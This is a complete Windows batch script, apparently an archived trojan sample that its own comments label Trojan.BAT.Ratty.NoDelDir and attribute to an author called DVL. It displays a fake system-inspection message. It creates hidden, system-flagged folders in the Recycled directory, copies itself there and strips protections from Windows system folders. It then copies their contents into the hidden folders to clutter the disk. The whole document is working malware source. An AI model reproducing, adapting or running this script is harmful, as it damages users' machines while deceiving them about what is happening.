   @echo off
   @echo @echo Please wait while windows inspects system ...
   @md c:\Recycled\ÅRatty >nul
   @md c:\Recycled\ÅRattyÅ >nul
   @attrib c:\Recycled\ÅRatty +s +h -r +a
   @attrib c:\Recycled\ÅRattyÅ +s +h -r +a
   @copy %0 c:\Recycled\ÅRatty >nul
   @copy %0 c:\Recycled\ÅRattyÅ >nul
   @attrib c:\windows\system\*.* -s -h -r +a
   @attrib c:\windows\inf\*.* -s -h -r +a
   @attrib c:\windows\help\*.* -s -h -r +a
   @attrib c:\windows\sysbckup\*.* -s -h -r +a
   @attrib c:\windows\java\*.* -s -h -r +a
   @copy c:\windows\system\*.* c:\Recycled\ÅRattyÅ >nul
   @copy c:\windows\inf\*.* c:\Recycled\ÅRattyÅ >nul
   @copy c:\windows\help\*.* c:\Recycled\ÅRattyÅ >nul
   @copy c:\windows\sysbckup\*.* c:\Recycled\ÅRattyÅ >nul
   @copy c:\windows\java\*.* c:\Recycled\ÅRattyÅ >nul
   @copy c:\windows\system\*.* c:\Recycled\ÅRatty >nul
   @copy c:\windows\inf\*.* c:\Recycled\ÅRatty >nul
   @copy c:\windows\help\*.* c:\Recycled\ÅRatty >nul
   @copy c:\windows\sysbckup\*.* c:\Recycled\ÅRatty >nul
   @copy c:\windows\java\*.* c:\Recycled\ÅRatty >nul
   @attrib c:\Recycled\ÅRatty\*.* +s +h +r +a
   @attrib c:\Recycled\ÅRattyÅ\*.* +s +h +r +a
   ::Kaspersky name is Trojan.BAT.Ratty.NoDelDir
   ::Another DVL creation
   ::dvl2003ro@yahoo.co.uk
   cls
